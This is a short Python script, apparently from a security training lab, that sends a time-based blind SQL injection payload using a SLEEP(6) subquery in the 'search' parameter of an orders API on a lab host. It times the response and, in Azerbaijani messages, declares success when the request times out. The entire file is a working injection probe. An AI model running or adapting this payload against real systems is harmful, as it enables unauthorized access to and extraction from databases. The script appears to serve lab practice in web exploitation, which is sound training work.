import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/api/all_orders"
payload = "test' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)--"

print("API-yə sorğu göndərilir...")
start = time.time()
try:
    res = requests.get(url, params={"search": payload}, timeout=10)
    print(f"Müddət: {time.time() - start:.2f} saniyə")
except requests.exceptions.Timeout:
    print("[+] UĞURLU! API üzərindən Timeout baş verdi (Gecikmə işlədi!).")
